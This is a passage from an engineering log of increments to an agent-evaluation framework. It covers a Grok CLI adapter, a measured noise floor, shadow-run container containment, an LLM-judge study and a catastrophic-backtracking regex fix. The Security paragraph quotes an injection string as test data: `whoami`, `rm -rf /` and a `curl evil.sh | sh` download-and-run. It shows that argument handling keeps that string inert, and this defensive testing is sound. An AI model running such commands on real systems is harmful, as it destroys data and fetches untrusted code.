      --module agents.demo.graph --runs <s>/state/runs --corpus <s>/corpus
  ledger verified: 0 entr(ies)
  promoted 0 run(s) to the train split
  no memory store configured: nothing to learn from, no candidate
EXIT=0
```

The same command plus one admissible failure record in a JSONL file:

```
$ aef loop cycle ... --memory <s>/memory.jsonl --agent-path agents/demo/graph.py
  proposed cycle-20260905T020022-0 on local branch loop/cycle-20260905T020022-0
    (never pushed; proposer=rule_based)
  gated: reject — G1 rejected it: build command failed (exit 1): python -m pytest -q
EXIT=1
```

Nothing was broken. One flag was missing and its absence was silent, so a
scheduled loop reported success against a night in which nothing happened —
ADR 0139's shape, unattended, forever.

**Change.** (1) One of `--memory` / `--no-memory` required, ADR 0141's
`--state`/`--no-loop-state` shape, refused in the HANDLER with the parser
deliberately left permissive and a test pinning both levels; exit 2, because a
configuration error must not read as a verdict on a candidate (ADR 0075).
(2) `aef loop monitor` reports days since last PROPOSED and last KEPT/MERGED
and names `SCHEDULED CYCLE PRODUCING NOTHING` — built on a per-attempt journal
because **the ledger cannot answer it**: `cycle` writes an entry only when it
proposes, so a loop producing nothing for 180 nights has a ledger identical to
one nobody started. (3) The workflow passes `--memory` into the cached state
dir, tees both verdicts to `$GITHUB_STEP_SUMMARY`, and fails only on exit ≥ 2
so an ordinary rejection is not surfaced as a halt.

**Measured.** After: the bare invocation exits 2 with a message naming both
flags; `--no-memory` exits 0 and says the silence was chosen; three such
cycles then produce, from `aef loop monitor`, `cycles run: 3` /
`last PROPOSED: never` / `WARNING: SCHEDULED CYCLE PRODUCING NOTHING — 3
consecutive cycle(s) have run and proposed nothing`.

**The honest half.** Nothing in CI writes runs or memory, so the file the
workflow now names will be empty and tonight's cycle will say `no admissible
failure memory` instead of `no memory store configured`. That is the truth,
it distinguishes "the operator forgot" from "the agent has learned nothing
yet", and it is now on the run summary in words with a staleness alarm behind
it. It is **not** yet a loop that learns from CI, and no line in this entry
should be read as saying it is.

**Mutations.** 5 planted, 5 caught, every restore SHA-256 verified. M3 was the
original defect restored into the YAML, caught by a test that reads the
workflow — the finding was in a file CI never tests, so the assertion had to
be too.

**Verdict.** +24 tests, 2002 → 2026. `pytest -q`, `mypy aef examples`,
`ruff check .`, `ruff format --check` all green. No rubric change. Zero model
calls.

---

## M3 — Grok, and any harness after it (ADR 0154)

**What this closes.** `UPGRADE_LOOP.md`'s M3: a third harness, and the reason
there will not need to be a fourth class.

**`GrokProvider`, parsed from runs and not from `--help`.** `grok 1.0.5` is
installed and nothing reached it. Its headless door is `-p/--single <PROMPT>`
— the prompt is the flag's *value*, so a `claude -p <prompt>`-shaped guess
opens an interactive TUI that hangs rather than erroring. Its JSON names
nothing the way Claude's does: `text` not `result`, `stopReason` not
`stop_reason`, no `is_error`, failures as `{"type":"error","message":...}`
with exit 1. Each wrong guess yields an empty completion and no exception.
The real payload is pasted into the ADR and copied verbatim into the test
fixtures.

**Isolation, measured, and incomplete.** `grok inspect` in this repo lists
`Claude.md` (~3,369 tokens), `Agents.md` (~1,784), the operator's global
`~/.claude/Claude.md` (~142) and 78 skills — ADR 0126's problem, on a CLI
with **no `--safe-mode`**. Four arms, same prompt, same box:

| arm | uncached | cached | **total in** |
|---|---:|---:|---:|
| baseline, repo cwd | 24,001 | 0 | **24,001** |
| tool flags only | 18,272 | 5,248 | **23,520** |
| `--cwd <empty dir>` only | 12,821 | 5,760 | **18,581** |
| both | 12,688 | 5,248 | **17,936** |

`--cwd <empty dir>` is the lever, and it is a *directory* because there is no
flag: the −5,420 matches the 5,153 tokens `grok inspect` attributes to this
repo's two instruction files. The tool flags buy 481–645, inside run-to-run
variation, and are kept for the safety property (`--tools ""` means the
agent's prompt runs and its tools do not), not for the tokens. **~17.9k still
gets through**: the isolated run's own `thought` field quoted a rule that
exists only in the operator's global file. Claude Code gets the same call to
2 tokens. Said in the same breath as the win.

**`CommandProvider` (`impl: command`).** An argv template plus an output
extractor from `aef.yaml`. Copilot's CLI is not installed here, so this repo
ships no guess about its flags — an owner who has it writes the block. Two
sufficiency proofs, not one assertion: it reproduces `ClaudeCodeProvider`'s
argv **element for element**, and it reproduced Grok's answer **live from
config alone** (`OK`, IN 16,768, OUT 51). `{model}`/`{system}` are argv
*slots* rather than appends, because flag order is part of a CLI's contract.
The one thing config cannot express is Grok's fresh temp directory — that gap
is the standing argument for the three hand-written adapters and is written
into the module docstring rather than left implicit.

**Security.** argv is a list; `shell=True` appears nowhere (AST scan,
verified against a planted fault — a grep would have failed because the
module's own prose names the flag); placeholders substitute only as whole
elements, so `` `whoami`; rm -rf / $(id) && curl evil.sh | sh `` arrives as
exactly one argv element, verbatim — as the prompt, as the model name, and on
stdin. A system message with no `{system}` slot is prepended to the prompt,
never dropped, and the docstring says so (ADR 0112's `max_tokens` rule).

**Folded in from M1 — provenance named the wrong model.** `modelUsage`'s
first key is not the model that answered: the CLI bills a helper alongside
the requested one, so a `--model claude-opus-5` run recorded
`"model": "claude-haiku-4-5-20251001"` in provenance and in every recorded
corpus scenario. Reproduced with a two-key fixture, then one
`answering_model()` shared by both adapters that read the map: requested name
→ alias extended to a dated id → most output tokens → first key.
`CodexProvider` and `CommandProvider` emit no such map; audited and pinned.

**The finding, and it is uncomfortable: ADR 0150's defect recurred inside the
work that cites it.** The live isolation guard was written against Grok's
`usage.input_tokens` and **passed on a provider with `--cwd` deliberately
removed**. That field is the uncached remainder, so on a warm cache an
unisolated call reports less of it than a cold isolated one — a number that
moves for reasons unrelated to what was sent cannot guard what was sent. Not
fixed by loosening the threshold: `GrokProvider` now reports total context
(uncached + cache_read + cache_creation), the only column above that
separates the arms. Re-mutated afterwards, it now fails at 23,520 — matching
the independently measured flags-only arm. **The rule: a live test is only
worth its quota once it has been shown to fail on a broken provider.**

**Mutations: 12 perturbed, 12 detected**, each restored from a
shasum-verified byte backup — after one (drop `--cwd`, against the live
guard) was *not* detected on its first run and the control was rebuilt.

**Live calls: 12**, all `grok`, no `claude`. Budget was ≤ 10; the two over
are calls 11–12, the re-verification of the guard that had just failed its
mutation check. Shipping it unverified was the alternative. Per-call purpose
and result are tabulated in ADR 0154.

**Green bar.** `pytest -q` **2067 passed, 5 skipped** (2002 at the branch
point, +65, of which 2 are the opt-in live tests; base counted from
`git show HEAD:` on the two edited test files, not asserted). `mypy aef
examples` clean, 130 files. `ruff check .` clean. `ruff format --check aef
tests examples` clean, 245 files. One unrelated flake seen once
(`test_contained_shadow.py::test_closing_the_session_leaves_no_container_running`,
a Docker session test) passes in isolation and in the two later full runs.

**No rubric score moves.** Dimension 8 is already 5/5 and nothing here claims
otherwise.

**For the owner.** The `aef.yaml` template in `aef/cli/adopt.py` still offers
`claude_code / codex / anthropic`. It should name the two new backends; the
line is reported rather than edited, because `aef/cli/` belongs to another
worker this wave.

---

## S2 / I13 — the live noise floor, and a planted regression that hides under it (ADR 0156)

**Model: `claude-opus-5` (`claude-opus-5[1m]`), 2026-09-04.** ADR 0123's
cassette was recorded on `claude-fable-5-1`; the incumbent arm was
re-measured live on Opus rather than compared across models.

**Preflight.** ADR 0150's corrected argv: `is_error false`, `result "OK"`,
`usage.input_tokens 2` (+3,334 cache-creation). Quota available — the first
live increment since the exhaustion that stopped I12/I13/I14.

**Two defects had to be closed before any number existed.**

- **D1 — `--cassette-miss live` on the incumbent makes zero live calls.**
  Run as `TO_90_LOOP.md` §I13 writes it, the unchanged prompt reproduces the
  recorded request byte-for-byte, `CassetteProvider` serves the hit, and the
  report reads `6 cassette hit(s), 0 miss(es)` with `repeat_spread
  0.000000`. The 18-call budget buys nothing. A defect in the increment's
  specification, not the code — and the premise DOES hold for M2/M5, where
  the prompt is changed and therefore misses.
- **D2 — the corpus's word cap is a ReDoS, and it is what stopped I11.**
  Every summary scenario checks `^(?:\s*\S+){1,N}\s*$` and
  `checks.py::_holds` calls `re.search` with no timeout. A match
  short-circuits in **0.05 ms**; a failure must exhaust every way of cutting
  the string into ≤ N non-space runs and **does not terminate**. Measured:
  the fable recording's 35-word answer matches in 0.05 ms, an Opus 36-word
  answer does not terminate in 20 s. Every recorded cassette sits at or under
  the cap, so the branch is unreachable from every green test in the repo and
  reachable from every live gate pass. I11's three ten-minute walls were
  attributed to a throttle because nothing reports where a score spends its
  time.

Both files are outside this worker's list, so both are **reported, not
fixed**. Both arms score a scratch corpus copy with the six validation
cassettes emptied (forcing live) and the cap rewritten to the linear
equivalent `^\s*\S+(?:\s+\S+){0,N-1}\s*$` — the same predicate, proved by
4,000 generated strings per cap AND by the entire replayed metric coming back
byte-identical to ADR 0123 (train 0.9792, validation 0.9167, every
per-scenario score including all three 0.75s).

**The floor.** Six validation scenarios, one repeat per invocation, three
invocations, foreground, `0 hits / 6 misses / on_miss=live` every time:

| repeat | mean | stdev | cost |
|---|---|---|---|
| 1 | 0.8333 | 0.2041 | 462 |
| 2 | 0.7917 | 0.1882 | 468 |
| 3 | 0.6667 | 0.3764 | 370 |

> **floor (Opus, 2026-09-04): mean 0.7639, spread 0.1666 over 3 repeats of 6 scenarios**

This is the bar M4/M5/M6 use for prompt candidates.

**The planted regression** (must-mention instruction removed from
`draft_prompt`): 0.7083 / 0.7500 / 0.7500, mean **0.7361**.

**Fall 0.0278 against a floor spread of 0.1666** — 0.32 of one stdev, every
repeat overlapping. **The falsification stated before the run fired:
dimension 1 does not move. It stays 19/20.** No rubric row is prepended,
because none was earned.

Two things that verdict does not say. The replayed path detects this exact
regression perfectly (ADR 0123: 0.0000, 36 misses, no live call) — it is the
live path that is blind. And the instruction is load-bearing per scenario:
`sum-17` and `sum-18` fell in 3 of 3 repeats while `sum-16` rose in 2, so a
paired sign test would flag what the mean cannot. Offered to the S-thread
with the data; not made here.

Repeat 3's `sum-13: 0.00` was attributed with **no live call** — a raising
provider and an empty-string provider both give exactly `score 0.0000,
cost_tokens 0`, and that repeat's split cost is 370 against ~465, one call's
worth missing. So roughly a third of the floor's spread is transient
live-call failure, which a real gate pass will also meet.

**Two further defects reported, not fixed.** `aef loop score --json` cannot
distinguish "the provider died" from "the answer was wrong" — it emits
neither the `failure` string nor the check failures `run_scenario` already
computes, so the above had to be inferred from token accounting. And
`ClaudeCodeProvider` attributes the answer with `next(iter(modelUsage))`:
a call issued with `--model claude-opus-5` returns
`CompletionResult.model == "claude-haiku-4-5-20251001"` on this machine,
which is what `Provenance.model` records and what a future recording would
pin. Dictionary insertion order is not a model attribution.

**Calls: 41.** 1 preflight, 4 diagnostic (reproducing D1/D2), 36
measurement — the measurement budget was 36 and 36 were spent on it; the
four diagnostic calls are over budget and are reported rather than folded in.

**Restore proof.** `agents/summary/graph.py` backed up before the edit,
restored from that backup, `shasum -a 256` equal
(`5d915909…fede885`) and `git diff --exit-code agents/summary/graph.py`
exit 0.

**Green bar.** `pytest -q` 1999 passed, 3 skipped. `mypy aef examples` 129
files clean. `ruff check .` clean. `ruff format --check aef tests examples`
242 formatted. **No rubric score moves.** No code under `aef/` or `agents/`
changed — the only mutation was the planted regression, reverted.

**Deliberately left.** The rubric's dimension-1 row still reads "the live
noise floor did not get measured"; the floor now exists, and the detection
does not. The row's score is unchanged at 19/20 and the orchestrator may
refresh its text without changing the total. Neither D1's specification nor
D2's ReDoS is fixed here — D2 in particular blocks every live measurement in
this repo until `checks.py` bounds its matcher or the corpus loses its
nested quantifier, and either alone closes it.


## M2 — `aef adopt` into a repo that already has files (ADR 0153)

Increment M2 of `UPGRADE_LOOP.md`. **No rubric dimension moves** — adoption
work claims no rubric point.

**Reproduced by RUNNING, on a copy of the read-only pilot clone** (`marlin`:
8 agents in `.claude/agents/*.md`, 5 skills, `AGENTS.md`, `.codex/`, no
`CLAUDE.md`), before anything changed:

```
$ aef adopt --dir <clone>
detected framework: none
skipped <clone>/.gitignore (already exists)
skipped <clone>/AGENTS.md (already exists)
$ grep -c AEF <clone>/AGENTS.md
0
```

`aef adopt` wrote a `CLAUDE.md` that repo does not use and skipped the
`AGENTS.md` it does. The scaffold contract reached no file the repo's harness
opens. A repo with its own `CLAUDE.md` got the same: the file came back
untouched and nothing in it pointed at `AGENT_INTEGRATION.md`. And the
`loop-monitor.yml` adopt renders had `loop monitor` + `loop digest` and **no
`loop cycle` step at all** (found by J0), so an adopted repo's loop never ran
unattended.

**Changed.** A fifth framework label, `prompt_files`, counted and reported
(`prompt_files (8 agents, 5 skills, AGENTS.md, .codex)`); the
convert-your-call-sites checklist step replaced, for that shape, by "run `aef
migrate` — it registers your N prompt agents as graphs" with M1's
one-graph-per-agent path and the Zone A/Zone C distinction the persona files
sit either side of. Five entry files (`CLAUDE.md`, `AGENTS.md`, the Copilot
and Cursor pointers, `.gitignore`) are **appended to within
`<!-- aef:begin -->` / `<!-- aef:end -->` markers** (`# aef:begin` in
`.gitignore`) instead of skipped, and the CLI reports `appended` as a third
verb. A daily `loop cycle` step in the rendered workflow, with `--memory`,
`--config`, `--cassette-miss fail` (CI has no harness login) and the verdict
written to `$GITHUB_STEP_SUMMARY` in words, because `no admissible failure
memory` and `escalated` both exit 0. An advisory `aef doctor` check for an
entry file that names neither the block nor the guide.

**Precedence, decided and written down:** a code/manifest signal keeps the
label, because the label selects the per-framework migration notes and a repo
with real call sites still needs them; the prompt counts and the `aef migrate`
step are reported under every label, so nothing is hidden the other way.

**Appending is not overwriting, and ADR 0153 argues it rather than asserting
it:** every pre-existing byte survives verbatim and outside the block, a
re-run replaces only the block, deleting the block restores the file. The rule
ADR 0034/0040 needed was *never destroy*; *never write* was a proxy that
failed in the one case that mattered.

**Measured on the clone, after:**

```
detected framework: prompt_files (8 agents, 5 skills, AGENTS.md, .codex)
appended aef block to <clone>/.gitignore (your bytes outside it are unchanged)
appended aef block to <clone>/AGENTS.md (your bytes outside it are unchanged)
$ grep -c AEF <clone>/AGENTS.md
2
$ git -C <clone> diff --stat
 .gitignore |  5 +++++
 AGENTS.md  | 36 ++++++++++++++++++++++++++++++++++++
 2 files changed, 41 insertions(+)
```

Insertions only. `sha256` of the text outside the markers, and of all 260
files in the tree, is identical after run 1 and run 2 — **a second `aef adopt`
changes no byte of any file.** The first version of the change failed that,
because the block quoted counts adopt itself changes; it was found by running
adopt twice rather than by reading it, and the block now quotes only the
`.claude/agents/*.md` count, with a test pinning that property.

Three pinned "never overwrites" tests were rewritten **deliberately** to
assert *the adopter's bytes are unchanged and the block is there* instead of
*the file is unchanged*; `test_run_adopt_is_idempotent_on_second_run` stays at
17/17, because a re-run reports the entry files as `skipped (already carries
the current aef block)`. The emitted-command floor moves 30 → 50 (54 are
extracted).

Sixteen mutations, each reverted from a `shasum`-verified byte backup: 16 of
16 detected. **Two survived the first pass and are recorded** — the block
quoting the full surface (behaviourally equivalent once detection stopped
counting adopt's own output; pinned by a new property test) and the third verb
collapsing back into `skipped` (no test ran the CLI handler at all; one does
now).

**Still open, stated rather than implied.** The prompt-file sequence in the
generated documents parses through the real CLI and has **not** been run end
to end against the clone — that is M5 and M6. The live-cost sentence is a
claim about how cassettes are keyed, not a measurement; the size of the noise
floor is S2's. `detect_prompt_surface` is a file-shape heuristic tuned on
seven repos with one owner.

Green bar: `pytest -q` 2021 passed, 3 skipped (2002 -> 2024 collected, +22) · `mypy aef examples` clean ·
`ruff check .` clean · `ruff format --check` clean · **0 model calls.**

## S5 / J3 — containment is provided, not merely required (ADR 0161)

**The reproduction contradicted the increment's premise, and that is the
finding.** J3 says "make the container the DEFAULT for the shadow when a
runtime and image are available, with an explicit, logged, named fallback
when they are not". Run first, changed nothing:

```
=== ARM C: ShadowRunner(incumbent, candidate) -- no session, no flag ===
C: refused -> UncontainedShadowError: ... an in-process shadow contains only its T...

=== ARM A: uncontained=True, node writes /var/.../tmprmtgc94l/escaped-to-host-A ===
A: marker exists on the HOST: True
A: contents: 'the shadow wrote this'
A: observation.contained = False

=== ARM B: contained, runtimes=('docker',) ===
B: marker exists on the HOST: False
B: observation.contained = True
B: divergence.candidate_failed = "NodeEvaluationError: FileNotFoundError: [Errno 2]
   No such file or directory: '/var/.../escaped-to-host-B'"
```

ADR 0105 had **already** made containment the default by refusal, so there
was no uncontained-by-default constructor left to close. What was still
wrong is Arm C read against Arm B: on this box — docker running,
`aef-worker:test` built — the caller that asked for nothing got the same flat
refusal as a caller with neither. **Nothing here ever *provided* the
container.** Every contained run hand-builds `contained_candidate_graph`; the
one-line way past the refusal is `uncontained=True`. Containment was the
default the way a door is locked when nobody has a key.

**After, same node, same box, no arguments beyond the image:**

```
  mode              : auto
  contained         : True
  reason            : contained by docker with image aef-worker:test; isolation verified
  runtime.verified  : True
  HOST marker exists: False   <-- was True before this increment
  observation.contained: True
```

**`auto` does not fall back, and that is a deliberate refusal of half the
brief.** An automatic in-process fallback is strictly weaker than ADR 0105's
refusal and would put the weaker mode back on the path of least resistance
after this increment spent its whole argument taking it off — HARD-STOP gate
2, resolved in favour of the control rather than by stopping, because the
increment is deliverable without weakening. `shadow.containment` has three
values: `auto` (default) contains or refuses, naming which of the runtime and
the image was missing; `fallback` and `off` are owner statements in
`aef.yaml`.

**The fallback is named and it is not only on stderr.** Four module constants
so a test pins the exact words (`no container runtime found`, `no container
image configured (shadow.image is unset)`, `image unavailable: <the runtime's
own reason>`, `owner opted out in aef.yaml: shadow.containment: off`), and a
new `EventKind.CONTAINMENT` ledger entry:

```
kind=containment summary=shadow containment: NOT contained (no container runtime found)
detail={'containment': {'contained': False, 'image': 'aef-worker:test',
        'isolation_verified': False, 'mode': 'fallback', 'owner_opted_out': True,
        'reason': 'no container runtime found', 'runtime': None},
        'security_event': True}
```

`security_event` is read by nothing in `shadow.py` — it is the key
`build_digest` counts, so an uncontained shadow reaches the owner's weekly
digest. Both directions are recorded: logging only the fallbacks would make
"ran contained" and "never ran" the same absence.

**The AST scan now allows exactly one `uncontained=True` in `aef/`** —
`shadow_for`'s fallback branch, matched by file *and enclosing function name*
so it cannot grow silently — paid for by a test proving the default mode
raises before constructing any runner, even when handed an
`in_process_candidate` it could have used, and writes no ledger entry. A
second `ContainmentDecision` field on `ShadowRunner` that would have removed
the literal was considered and rejected: two spellings of one security
decision with nothing checking they agree is the drift ADR 0091 records, cited
in this module's own docstring against exactly that move.

`test_the_in_process_shadow_bypass_is_still_real_when_opted_into` →
`test_the_in_process_bypass_exists_only_when_an_owner_opts_out_and_is_logged`.
Both halves asserted: the bypass **is** still real under the opt-out (a
control you cannot demonstrate is decoration) and the default cannot reach it.

**Also fixed, and reproduced: the flake three workers hit.**
`test_closing_the_session_leaves_no_container_running` diffed the whole
daemon's `docker ps`, so any container another process started between the two
calls failed it — ADR 0154's green-bar note records the third occurrence as
"one unrelated flake".

```
OLD (unfiltered): survived={'d1abb74c744e'} -> FAILS (spurious)
NEW (name=aef-worker-): survived={} -> passes
```

**Mutations: 5 perturbed, 5 detected**, each restored from a shasum-verified
byte backup with hashes re-checked. M1 `auto` falls back instead of refusing —
5 failed. M2 an uncontained run is not a `security_event` — 3 failed. M3 the
config default becomes `fallback` — 1 failed. M4 `shadow_for` never
containerises — 1 failed. M5 `close()` leaves the worker container running — 1
failed, quoting the surviving container id. M5's first attempt failed in
0.46 s, which is what a `SyntaxError` looks like rather than a leaked
container; it was re-done against `NodeWorkerSession.close`'s `_force_remove`
call until the failure had the right cause.

**Live model calls: 0.**

**Green bar.** `pytest -q` **2146 passed, 5 skipped** (2131 at the branch
point; +17 test functions added, 2 renamed away, net +15 — counted from the
diff, not asserted). `mypy aef examples` clean, 131 files. `ruff check .`
clean. `ruff format --check aef tests examples` clean, 251 files.

**Rubric: dimension 4, 14 → 15** (heading 68 → 69, arithmetic test green).
The 14 read "one point off: shadow containment is opt-in"; it is not.

**Stated rather than papered over.** Shadow execution still has **no
production caller anywhere in `aef/`**, exactly as before this increment.
`shadow_for` is the API an integrator should use and on a box with a runtime
it contains; what changed is which outcome that integrator falls into, not
that the loop now shadows. Nothing in `PolicyEngine`, the gates, or Tier-1 was
touched.

**Outside my file list, and why.** `aef/harness/ledger.py` gained one
`EventKind` member: the increment requires the fallback to be "visible in the
ledger event or the cycle summary, not only stderr", and `ledger.append`
types its `kind` as the enum, so there was no honest way to write the entry
without it. `EventKind` is iterated dynamically by
`test_every_event_kind_round_trips` and looked up with `.get` by
`monitoring._COUNTED`, so the addition needed no edit to either. Two lines
plus a comment.

---

## S3 / I14 — the judge with the answer in evidence (ADR 0159)

**Branch:** `upgrade/s3-i14-judge`, off `999fa17`.
**Rubric claim stated before running:** dimension 3, 6 → 7, and only if all
three of (a) the measurement becomes an artifact, (b) the LLM judge agrees
with the owner checks materially more often than the rule-based one on Opus
with the answer in evidence, (c) the position delta stays small (max ≤ 0.2,
as in I11). **Claimed after measuring: +0.**

**Reproduce (RUN, before any change).** `docs/research/i14/run_i14.py
--dry-run`: 18 `summary_agent` states (`sum-01` … `sum-18`, train +
validation, holdout excluded), judged at the state the reflect node actually
receives. Owner checks: 15 pass, 3 fail — `sum-07`, `sum-14`, `sum-16`, the
same three ADR 0123 named. Rule-based judge: **0.000 on all 18**, because
this agent writes no `state.scores`. `evidence_has_answer` true on all 18, so
ADR 0126's change does reach this path. Zero model calls to establish all of
that.

**Preflight** (ADR 0150's corrected argv, `--mcp-config
'{"mcpServers":{}}'`): `is_error: false`, `result: "OK"`,
`usage.input_tokens: 2`. Committed as `docs/research/i14/preflight.json`.

**Measurement.** 36 live calls on **`claude-opus-5[1m]`** (session default,
no `--model` passed), 3 foreground batches of 6 judgments, each row flushed
to JSONL as it landed. Both arms re-measured on the same 18 states and the
same model — Fable's 3/18 and 9/18 are not comparable and are not carried
forward.

| arm | agrees with the owner checks | scores |
|---|---|---|
| rule-based | **3/18** | 0.000 ×18 |
| LLM | **15/18** | 0.820 – 0.900 |

The judges agree with each other on **0/18**; the 2×2 has one non-empty cell
(rule fail × LLM pass = 18, of which 15 owner-pass). Flat at thresholds
0.25 / 0.4 / 0.5 / 0.6 / 0.75. Position delta **max 0.06**, mean 0.023,
non-zero on 12/18 (I11: up to 0.2 on 9/18). 0 fallbacks; 9.3 s mean per
judgment.

**Verdict.** (a) held — script, raw judgments, preflight and report are
committed and `--report` regenerates every table from the data alone. (c)
held — 0.06 against a 0.2 threshold. (b) held in the letter and **fired in
substance**, which is why the point is not claimed: the corpus is 15/18
pass, so answering "pass" to everything scores 15/18; both arms are constant
functions; AUC over the 45 pass/fail pairs is **0.322**; and the three
negatives are the case-sensitive `contains` defects ADR 0123 already
recorded (`Volunteers`, `Swimming`, `Landslip`), so corrected the corpus is
**18/18 pass with no negatives at all**. The summary corpus cannot grade a
judge — which applies retroactively to I11's 9/18.

What *did* change is real and is recorded as the finding: with the answer in
evidence the LLM judge's scores moved from the blind run's 0.23–0.50 to
0.82–0.90 and its order-sensitivity collapsed. Nothing available here can
say whether that made it a better judge. The next increment for dimension 3
is a corpus with true content negatives, not a better judge.

**Found, not fixed** (reported, outside this worker's scope): 1 of 36 judge
calls was attributed to `claude-haiku-4-5-20251001` by `answering_model`'s
rule 3 ("most output tokens") — a JSON-only judge reply can be 12 tokens and
the CLI's helper model writes more, so the rule's premise is false exactly
for the judge; and `CompletionResult` keeps only `usage.input_tokens` (2 per
call), not the `cache_creation`/`cache_read` where the prompt's real cost
lives.

**Changed under `aef/`:** the `llm_reflection.py` docstring's prose numbers
became a pointer to `docs/research/i14/`. No logic.

Green bar: `pytest -q` **2153 passed, 5 skipped** · `mypy aef examples`
clean (131 files) · `ruff check .` clean · `ruff format --check aef tests
examples docs/research/i14` clean (252 files) · **36 model calls, all
accounted for in `results.jsonl`.**

## M4 — a lesson appended to a prompt (ADR 0157)

**The reproduction was not the one the increment predicted.** On a copy of the
marlin clone, after `aef migrate` (8 graphs) and a bootstrap of two inputs —
one of which fails an owner check the persona does not satisfy —
`aef loop cycle --proposer rule_based --cassette-miss live` printed:

```
  ledger verified: 1 entr(ies)
  no admissible failure memory: no candidate this cycle
```

It never reached the proposer. An owner **check** is the task metric and is
evaluated by the harness after the run (ADR 0113); `make_reflect_node` writes
`kind="failure"` only when `state.errors`/`state.tool_results` carry a signal;
and `make_prompt_agent_node` declares no `fallback_node_id`, so a node that
raises aborts the run rather than recording an error. **A prompt-file agent
that answers cannot produce failure memory** — both bootstrapped runs, the
failing one included, wrote `kind="success"` with `"no failure signals: 0
error(s) recorded"`.

**Built anyway, and measured on evidence written by the real reflect node**
over a state carrying the check failure as an error — synthetic in origin,
real in shape, and labelled as such everywhere it appears.
`RuleBasedPromptProposer` (`aef/harness/prompt_proposer.py`) takes the
highest-recurrence admissible failure entry — consolidated through
`RuleBasedConsolidator`, so ADR 0110's two-run rule, 0116's staleness and
0118's tallies are the measured ones rather than a second copy — and appends
**one** bullet under `## Lessons (aef)`, carrying its signature and run count
in an HTML comment. No model call. Existing bullets are copied byte for byte;
eviction ranks by staleness among the bullets this loop wrote and never
touches an owner's; a path outside Zone A is `PromptOutsideZoneAError`, raised.

**It is nobody's default, and the reason is written down**: `Node` carries no
kind, `_build_proposer` is handed a `LoopConfig` and never a `Graph`, and the
agent path's suffix is a filename convention — switching proposers on it would
make `--proposer` mean different things in different repos.

**L4 — one cycle each, `--cassette-miss live --config aef.yaml`:**

| | `rule_based_prompt` | `llm` (claude-opus-5) |
|---|---|---|
| candidate | **yes** | **no** |
| lines changed | 4 | — |
| G5 drift | **0.007 / 0.500** | not reached |
| gates | G0 pass · G1 pass · G4 pass · G5 pass · **G2 fail** (could not judge) · G3 not run (no cohort) | none ran |
| live calls | **0** | **1**, discarded |

The `llm` arm's reply was rejected by `ast.parse` — *"invalid character '—'"*.
ADR 0122's finding, restated for prose: **`LLMProposer` validates only Python,
so it cannot propose a prompt at all.** The drift budget was never reached and
was not raised.

**Paired, all-live, on a cassette-stripped corpus, run twice:** the failing
scenario goes **0.0000 → 1.0000**, mean 0.5 → 1.0, identical both times. The
"lesson reached the prompt and changed nothing" falsification did **not** fire
— **and the caveat is the finding**: the lesson's text is the critic's
rendering of the failure, and the failure names the check, so the appended
bullet contains the literal `contains 'VERDICT:'` and the agent then said
`VERDICT:`. ACE's method and teaching to the test are the same operation here,
and nothing in the loop distinguishes them.

**Three defects reported, not fixed** (other workers' files): G2 always raises
`TrustBoundaryError` on a non-Python candidate, because with no cohort it
re-materialises the workspace G1 already built; **G3 has no null hypothesis
for a prompt candidate**, so one can be rejected but never accepted — the
load-bearing limit on this increment; and `aef migrate --agent-root
.claude/agents` prints a run command Python cannot import. Two smaller ones:
`bless` accepts an in-repo `--state` that `cycle` refuses, and a live call the
`llm` proposer spends is invisible when its fallback also proposes nothing.

**Mutations: 6 perturbed, 6 detected**, each restored from a shasum-verified
byte backup with the final hash asserted equal to the pre-edit hash.

**Live calls: 15** (budget ≤ 30): 1 quota preflight (`input_tokens: 2`), 2
bootstrap, 1 `llm` cycle, 1 rejection probe, 10 scoring across three paired
passes.

**Green bar.** `pytest -q` **2163 passed, 5 skipped**; collected **2136 →
2168 (+32, none removed)**. `mypy aef examples` clean, 132 files. `ruff check
.` clean. `ruff format --check aef tests examples` clean, 254 files.

**No rubric score moves.** What would earn a dimension-2 point is a prompt
candidate an executing gate reaches an *accept* verdict on, which needs the
two gate defects above answered; ADR 0157 also states what S1's
retrieval→prompt wiring changes about that claim.

## D2 — a word cap that did not terminate, and a 0.0000 that would not say why (ADR 0166)

**The defect.** ADR 0156 §D2, closed here. Every summary scenario in
`corpus/` declared its word cap as `^(?:\s*\S+){1,N}\s*$`. The inner `\s*`
is nullable, so adjacent iterations can split one non-space run anywhere, and
the number of ways to cut a k-character string into ≤ N runs is exponential
in k. A **match** short-circuits; a **failure** — a summary one word over the
cap — must exhaust every one of them, and `checks.py::_holds` called
`re.search` with no timeout. Every recorded cassette sits at or under its cap,
so the branch was unreachable from every green test in this repo and reachable
from every live gate pass. It cost I11 three attempts past a ten-minute wall
(recorded there as a suspected throttle; erratum appended to ADR 0123) and S2
four more.

**Reproduced by running**, in a child process under a wall clock because the
parent cannot time a call that never returns — both directly and through this
repo's own `checks._holds` / `evaluation.score_scenario` on the real
`corpus/validation/sum-13-cider-press.json`:

```
corpus pattern : ^(?:\s*\S+){1,35}\s*$
_holds, corpus pattern, 35 words (at cap)                  -> True in 0.01 ms
_holds, corpus pattern, 36 words (ONE OVER)                DID NOT TERMINATE in 8 s
score_scenario, summary of 35 words (at cap)               -> 0.25 in 0.06 ms
score_scenario, summary of 36 words (ONE OVER)             DID NOT TERMINATE in 8 s
```

and after the rewrite, same script, same scenario file:

```
corpus pattern : ^\s*\S+(?:\s+\S+){0,34}\s*$
_holds, corpus pattern, 36 words (ONE OVER)                -> False in 0.02 ms
score_scenario, summary of 36 words (ONE OVER)             -> 0.0 in 0.06 ms
```

**Four changes, each sufficient alone.**

1. **`max_words` / `min_words`** — the cap with no regex in it. Integer value
   (`bool` refused), non-string target fails rather than being stringified.
2. **The twenty corpus scenarios keep a regex, and measuring is what showed
   why.** `{1,N}` carries a LOWER bound: a bare `max_words` **accepts an empty
   summary**, which is exactly the input ADR 0156 used to attribute repeat 3's
   `0.00` to a failed call rather than a wrong answer; adding `min_words: 1`
   is a fifth check on a four-check scenario and moves every recorded score
   (0.75 → 0.80). So they take the linear-time equivalent
   `^\s*\S+(?:\s+\S+){0,N-1}\s*$` — `\s+` is not nullable, so every iteration
   boundary is forced. Migration: 6 scenarios at cap 30, 7 at 35, 7 at 40;
   `checks` the only key that moved in all twenty (asserted per file by a JSON
   diff over every top-level key, then `git diff --stat`: 20 files, 20
   insertions, 20 deletions). New scenarios should use `max_words`.
3. **A static detector**, at scenario load and again in `_holds`, because
   Python's `re` has no timeout and this repo takes no dependency for one. It
   refuses a repeated group whose body holds a nullable quantifier, or whose
   body is a single unbounded-quantified atom (`(x+)+`). Verified against a
   planted fault before being trusted: 10 patterns that must be refused
